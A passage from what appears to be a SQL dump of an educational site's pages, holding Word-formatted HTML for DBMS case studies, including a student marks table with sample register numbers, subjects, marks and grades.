style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">Member_ Last_Name<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"158\" valign=\"top\" style=\"width:118.7pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">Member_type<o:p></o:p></span></p>\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\n  mso-ansi-language:EN-US\">&nbsp;</span></p>\r\n  </td>\r\n </tr>\r\n <tr style=\"mso-yfti-irow:1;height:14.55pt\">\r\n  <td width=\"129\" valign=\"top\" style=\"width:96.55pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"165\" valign=\"top\" style=\"width:123.55pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"158\" valign=\"top\" style=\"width:118.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"158\" valign=\"top\" style=\"width:118.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n </tr>\r\n <tr style=\"mso-yfti-irow:2;mso-yfti-lastrow:yes;height:14.55pt\">\r\n  <td width=\"129\" valign=\"top\" style=\"width:96.55pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"165\" valign=\"top\" style=\"width:123.55pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"158\" valign=\"top\" style=\"width:118.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"158\" valign=\"top\" style=\"width:118.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n </tr>\r\n</tbody></table></div><div style=\"font-weight: bold; text-align: left;\"><br></div><div style=\"font-weight: bold; text-align: left;\"><p class=\"MsoNormal\"><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:107%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Entailment</span></b></p><p class=\"MsoNormal\"><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:107%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><o:p></o:p></span></b></p><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" align=\"left\" style=\"border: none; margin-left: 6.75pt; margin-right: 6.75pt;\">\r\n <tbody><tr style=\"mso-yfti-irow:0;mso-yfti-firstrow:yes;height:38.2pt\">\r\n  <td width=\"110\" valign=\"top\" style=\"width:82.15pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:38.2pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%;mso-element:frame;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;\r\n  mso-element-anchor-vertical:paragraph;mso-element-anchor-horizontal:margin;\r\n  mso-element-top:11.0pt;mso-height-rule:exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Member_type<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"85\" valign=\"top\" style=\"width:63.5pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:38.2pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%;mso-element:frame;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;\r\n  mso-element-anchor-vertical:paragraph;mso-element-anchor-horizontal:margin;\r\n  mso-element-top:11.0pt;mso-height-rule:exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Entailment<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr style=\"mso-yfti-irow:1;height:10.3pt\">\r\n  <td width=\"110\" valign=\"top\" style=\"width:82.15pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:10.3pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%;mso-element:frame;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;\r\n  mso-element-anchor-vertical:paragraph;mso-element-anchor-horizontal:margin;\r\n  mso-element-top:11.0pt;mso-height-rule:exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"85\" valign=\"top\" style=\"width:63.5pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:10.3pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%;mso-element:frame;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;\r\n  mso-element-anchor-vertical:paragraph;mso-element-anchor-horizontal:margin;\r\n  mso-element-top:11.0pt;mso-height-rule:exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n </tr>\r\n <tr style=\"mso-yfti-irow:2;mso-yfti-lastrow:yes;height:10.55pt\">\r\n  <td width=\"110\" valign=\"top\" style=\"width:82.15pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:10.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%;mso-element:frame;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;\r\n  mso-element-anchor-vertical:paragraph;mso-element-anchor-horizontal:margin;\r\n  mso-element-top:11.0pt;mso-height-rule:exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"85\" valign=\"top\" style=\"width:63.5pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:10.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%;mso-element:frame;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;\r\n  mso-element-anchor-vertical:paragraph;mso-element-anchor-horizontal:margin;\r\n  mso-element-top:11.0pt;mso-height-rule:exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n </tr>\r\n</tbody></table></div><div style=\"font-weight: bold; text-align: left;\"><br></div><div style=\"font-weight: bold; text-align: left;\"><br></div><div style=\"font-weight: bold; text-align: left;\"><br></div><div style=\"font-weight: bold; text-align: left;\"><br></div><div style=\"font-weight: bold; text-align: left;\"><br></div><div style=\"font-weight: bold; text-align: left;\"><br></div><div style=\"text-align: left;\"><p class=\"MsoNormal\" style=\"font-weight: bold; line-height: 150%;\"><br></p></div><div style=\"text-align: left;\"><p class=\"MsoNormal\" style=\"line-height:150%\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\"><o:p></o:p></span></i></p><p class=\"MsoNormal\" style=\"line-height:150%\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\"><o:p></o:p></span></i></p><p class=\"MsoNormal\" style=\"line-height:150%\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\"><o:p></o:p></span></i></p></div><div style=\"text-align: left;\"><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"background-color: rgb(255, 255, 255); border: none;\"><tbody></tbody></table></div><div style=\"text-align: left;\"><p class=\"MsoListParagraph\" style=\"text-indent:-.25in;line-height:150%;\r\nmso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><b><u><o:p></o:p></u></b></span></p><p class=\"MsoNormal\" style=\"line-height:150%\"><b><u><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><o:p></o:p></span></u></b></p></div><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\"><tbody></tbody></table>\r\n\r\n</div>','2020-03-21 07:11:57.000000',4,'logo_ac773e45b008d6616aadbc1a30507760_1x_5QG7ljw.png'),(7,'DBMS Case Study 2','dbms-case-study-2','<div><p class=\"MsoNormal\" style=\"font-weight: bold; line-height: 21px;\"><u><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Problem Statement :<o:p></o:p></span></u></p><p class=\"MsoNormal\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Consider a data base table consists of student details. Management also wants to add marks scored by student for a</span>ll the subjects.</p><p class=\"MsoNormal\"><span lang=\"EN-IN\" style=\"font-weight: bold; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\"><o:p></o:p></span></p><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\"><tbody><tr style=\"height: 26.6pt;\"><td width=\"73\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 54.9pt; border: 1pt solid windowtext; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Register No<o:p></o:p></span></p></td><td width=\"58\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 43.7pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Name<o:p></o:p></span></p></td><td width=\"94\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 70.3pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Department<o:p></o:p></span></p></td><td width=\"76\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 56.9pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Semester<o:p></o:p></span></p></td><td width=\"104\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 77.75pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Subject_code<o:p></o:p></span></p></td><td width=\"99\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 74.1pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Subject_title<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Marks<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Grade<o:p></o:p></span></p></td></tr><tr style=\"height: 13.7pt;\"><td width=\"73\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 54.9pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">101001<o:p></o:p></span></p></td><td width=\"58\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 43.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Ravi<o:p></o:p></span></p></td><td width=\"94\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 70.3pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CSE<o:p></o:p></span></p></td><td width=\"76\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 56.9pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">5<o:p></o:p></span></p></td><td width=\"104\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 77.75pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CS2304<o:p></o:p></span></p></td><td width=\"99\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 74.1pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">System Software<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">78<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">C<o:p></o:p></span></p></td></tr><tr style=\"height: 13.7pt;\"><td width=\"73\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 54.9pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">101001<o:p></o:p></span></p></td><td width=\"58\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 43.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Ravi<o:p></o:p></span></p></td><td width=\"94\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 70.3pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CSE<o:p></o:p></span></p></td><td width=\"76\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 56.9pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">5<o:p></o:p></span></p></td><td width=\"104\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 77.75pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CS2301<o:p></o:p></span></p></td><td width=\"99\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 74.1pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Software Engineering<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">99<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">A<o:p></o:p></span></p></td></tr><tr style=\"height: 13.7pt;\"><td width=\"73\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 54.9pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">101001<o:p></o:p></span></p></td><td width=\"58\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 43.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Ravi<o:p></o:p></span></p></td><td width=\"94\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 70.3pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CSE<o:p></o:p></span></p></td><td width=\"76\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 56.9pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">5<o:p></o:p></span></p></td><td width=\"104\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 77.75pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CS2302<o:p></o:p></span></p></td><td width=\"99\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 74.1pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times 